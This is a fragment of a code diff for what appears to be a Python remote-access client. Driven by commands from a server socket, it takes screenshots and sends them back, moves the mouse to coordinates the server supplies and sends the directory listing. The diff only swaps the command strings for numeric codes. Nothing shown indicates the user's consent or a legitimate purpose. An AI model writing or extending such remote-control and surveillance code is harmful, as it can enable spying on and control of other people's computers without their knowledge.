@@ -28,7 +28,7 @@ while True:
     print('Received from server: ' + data)  
         
     # -----> take screenshot 
-    if data == "screenshot":
+    if data == "1":
         ImageGrab.grab().save("sc.jpeg","JPEG")  
         sc=open("sc.jpeg","rb")
         scdata=sc.read(2048)
@@ -52,7 +52,7 @@ while True:
     
     
     # -----> move mouse 
-    if data == f"move your mouse":
+    if data == f"2":
          client_socket.send("give x and y".encode())
          msg = client_socket.recv(1024).decode(FORMAT)
          print(msg)
@@ -61,7 +61,7 @@ while True:
     
     
     # -----> send directory list 
-    if data == "send me directory list":
+    if data == "3":
         data=os.listdir()
         y = str(data)
         client_socket.send(y.encode())
